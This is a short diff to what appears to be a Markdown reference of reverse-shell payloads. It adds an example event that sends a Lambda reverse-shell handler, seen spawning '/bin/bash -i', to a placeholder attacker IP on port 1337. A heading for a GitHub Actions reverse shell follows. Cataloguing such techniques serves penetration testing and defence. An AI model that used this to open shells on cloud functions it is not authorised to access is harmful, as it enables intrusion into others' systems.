@@ -59,6 +59,12 @@ def lambda_handler(event, context):
     subprocess.call(["/bin/bash", "-i"])
 ```
 
+Invoke it with this event:
+
+```json
+{"ip_address":"MY_EVIL_IP_ADDRESS","port":1337}
+```
+
 ### Reverse Shell in GitHub Actions
 
 ```
